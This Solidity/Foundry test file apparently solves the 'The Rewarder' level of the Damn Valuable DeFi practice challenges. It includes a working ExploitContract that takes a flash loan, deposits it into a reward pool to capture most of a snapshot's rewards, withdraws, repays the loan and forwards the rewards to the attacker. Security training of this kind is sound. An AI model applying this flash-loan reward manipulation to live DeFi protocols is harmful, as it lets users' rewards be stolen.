// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";

contract TheRewarder is Test {
    // 1 million token
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    // user depositting
    uint256 internal constant USER_DEPOSIT = 100e18;

    // import utils
    Utilities internal utils;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal dvt;
    address payable[] internal users;
    address payable internal attacker;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        attacker = users[4];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        flashLoanerPool = new FlashLoanerPool(address(dvt));
        vm.label(address(flashLoanerPool), "Flash Loaner Pool");

        // Set initial token balance of the pool offering flash loans
        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        theRewarderPool = new TheRewarderPool(address(dvt));
        console.log("1:", theRewarderPool.lastRecordedSnapshotTimestamp());
        console.log("1:", theRewarderPool.lastSnapshotIdForRewards());
        console.log("1:", theRewarderPool.roundNumber());

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (uint8 i; i < 4; i++) {
            dvt.transfer(users[i], USER_DEPOSIT);
            vm.startPrank(users[i]);
            dvt.approve(address(theRewarderPool), USER_DEPOSIT);
            theRewarderPool.deposit(USER_DEPOSIT);
            assertEq(
                theRewarderPool.accToken().balanceOf(users[i]),
                USER_DEPOSIT
            );
            vm.stopPrank();
        }
        console.log("2:", theRewarderPool.lastRecordedSnapshotTimestamp());
        console.log("2:", theRewarderPool.lastSnapshotIdForRewards());
        console.log("2:", theRewarderPool.roundNumber());

        assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            assertEq(
                theRewarderPool.rewardToken().balanceOf(users[i]),
                25e18 // Each depositor gets 25 reward tokens
            );
        }
        console.log("3:", theRewarderPool.lastRecordedSnapshotTimestamp());
        console.log("3:", theRewarderPool.lastSnapshotIdForRewards());
        console.log("3:", theRewarderPool.roundNumber());

        assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
        assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
        assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // use flashloan to deposit and then withdraw to exploit the reward
        skip(6 days);
        vm.startPrank(attacker);
        ExploitContract exploitContract;
        exploitContract = new ExploitContract(
            address(flashLoanerPool),
            address(theRewarderPool),
            address(dvt)
        );

        vm.label(address(exploitContract), "exploitContract");

        exploitContract.attack(TOKENS_IN_LENDER_POOL);

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        console.log("3:", theRewarderPool.lastRecordedSnapshotTimestamp());
        console.log("3:", theRewarderPool.lastSnapshotIdForRewards());
        console.log("3:", theRewarderPool.roundNumber());
        assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
        for (uint8 i; i < 4; i++) {
            // Users should get negligible rewards this round
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(
                users[i]
            );
            uint256 delta = rewardPerUser - 25e18;
            assertLt(delta, 1e16);
        }
        // Rewards must have been issued to the attacker account
        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(
            attacker
        );

        // The amount of rewards earned should be really close to 100 tokens
        uint256 deltaAttacker = 100e18 - rewardAttacker;
        assertLt(deltaAttacker, 1e17);

        // Attacker finishes with zero DVT tokens in balance
        assertEq(dvt.balanceOf(attacker), 0);
    }
}

contract ExploitContract {
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal dvt;
    RewardToken internal rewardToken;
    address owner;

    constructor(address addr, address addr2, address addr3) {
        owner = msg.sender;
        flashLoanerPool = FlashLoanerPool(addr);
        theRewarderPool = TheRewarderPool(addr2);
        dvt = DamnValuableToken(addr3);
        rewardToken = RewardToken(theRewarderPool.rewardToken());
    }

    function attack(uint256 amount) external {
        dvt.approve(address(theRewarderPool), type(uint256).max);
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        require(msg.sender == address(flashLoanerPool), "only pool");
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        bool paidBorrow = dvt.transfer(address(flashLoanerPool), amount);
        require(paidBorrow, "borrow not paid back");
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        bool rewardSent = rewardToken.transfer(owner, rewardBalance);
        require(rewardSent, "Reward not sent back to the contract's owner");
    }
}